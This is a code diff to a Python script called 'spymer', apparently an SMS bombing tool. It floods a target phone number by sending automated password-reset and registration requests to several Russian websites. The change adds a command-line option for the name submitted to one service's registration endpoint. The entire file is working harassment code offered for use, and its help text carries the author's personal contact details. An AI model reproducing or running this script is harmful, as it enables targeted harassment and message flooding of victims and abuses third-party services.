@@ -7,6 +7,7 @@ class spymer:
 		import requests, datetime, sys, time, argparse
 		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work. Only for Russia!", epilog='My contacts: +79153509908 (Russia) or e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 79153509908)')
+		parser.add_argument('--name', help='name for SMSInt service (default: Hackers)')
 		args = parser.parse_args()
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
@@ -29,6 +30,7 @@ class spymer:
 				print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
 				exit()
 		_phone = args.phonenum
+		_name = args.name
 		iteration = 0			
 		_phone9 = _phone[1:]
 		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
@@ -57,7 +59,10 @@ class spymer:
 			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
 			rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
 			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
-			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':'Hackers','phone': _phone})
-			
+			if _name == None:
+				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':'Hackers','phone': _phone})
+			else:
+				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone})
+
 spammer = spymer()
 spammer.main()
